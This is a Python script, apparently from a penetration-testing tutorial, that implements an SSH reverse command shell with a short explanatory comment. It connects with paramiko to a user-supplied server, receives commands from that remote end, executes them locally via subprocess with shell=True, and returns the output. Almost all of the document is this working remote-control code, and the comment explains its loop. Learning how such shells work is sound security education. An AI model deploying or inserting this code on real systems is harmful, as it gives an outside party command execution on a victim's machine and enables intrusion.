import paramiko
import shlex
import subprocess
def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)#1
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)#2
                ssh_session.send(cmd_output or 'okay')#3
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()

    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')#4

 '''
The program begins as last one did, and the new stuff starts in the while 
True: loop. In this loop, instead of executing a single command, as we did in 
the previous example, we take commands from the connection 1, execute 
the command 2, and send any output back to the caller 3.
Also, notice that the first command we send is ClientConnected 4. You’ll 
see why when we create the other end of the SSH connection.
 '''

